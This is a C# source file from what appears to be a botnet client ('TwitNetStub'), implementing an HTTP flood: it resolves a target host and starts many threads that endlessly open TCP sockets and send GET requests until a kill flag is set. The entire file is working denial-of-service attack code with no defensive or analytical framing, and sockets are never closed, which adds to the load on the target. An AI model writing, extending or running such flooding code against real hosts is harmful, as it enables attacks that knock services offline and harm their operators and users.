using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace TwitNetStub.Util.Network
{
    sealed class Http
    {
        private static ThreadStart[] _tFloodingJob;
        private static Thread[] _tFloodingThread;
        public static string SfHost;
        public static int Port;
        public static IPAddress IPEo;
        private static HTTPRequest[] _hRequestClass;
        public static int Threads;

        private static bool _killThread;

        public static void StartHTTPFlood()
        {
            _killThread = false;
            try
            {
                IPEo = Dns.GetHostEntry(new Uri(SfHost).Host).AddressList[0];
            }
            catch
            {
                IPEo = IPAddress.Parse(SfHost);
            }

            _tFloodingThread = new Thread[Threads];
            _tFloodingJob = new ThreadStart[Threads];
            _hRequestClass = new HTTPRequest[Threads];
            
            for (int i = 0; i < Threads; i++)
            {
                _hRequestClass[i] = new HTTPRequest(IPEo, Port);
                _tFloodingJob[i] = new ThreadStart(_hRequestClass[i].Send);
                _tFloodingThread[i] = new Thread(_tFloodingJob[i]);
                _tFloodingThread[i].Start();
            }

        }

        public static void StopHTTPFlood()
        {
            _killThread = true; 
            for (int i = 0; i < Threads; i++)
            {
                try
                {
                    _tFloodingThread[i].Join(1000);
                }
                catch
                {
                    //Well shit son!
                }
            }
            //Config.Flooding = false;
        }

        private sealed class HTTPRequest
        {
            private IPAddress _sFHost;
            private int _portm;

            public HTTPRequest(IPAddress tHost, int port)
            {
                _sFHost = tHost;
                _portm = port;
            }

            public void Send()
            {
                while (!_killThread)
                {
                    try
                    {
                        byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.0{1}{1}{1}", "/", Environment.NewLine));
                        var host = new IPEndPoint(_sFHost, _portm);
                        {
                            byte[] recvBuf = new byte[64];
                            var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                            socket.Connect(host);
                            socket.Blocking = false;
                            socket.Send(buf, SocketFlags.None);
                            socket.Receive(recvBuf, 64, SocketFlags.None);
                        }
                        if (_killThread) { Thread.CurrentThread.Join(1000); }
                    }
                    catch { }// (Exception ex) { System.Windows.Forms.MessageBox.Show(ex.ToString() + "\n\n\n" + ex.Message); }
                }
            }
        }
    }
}
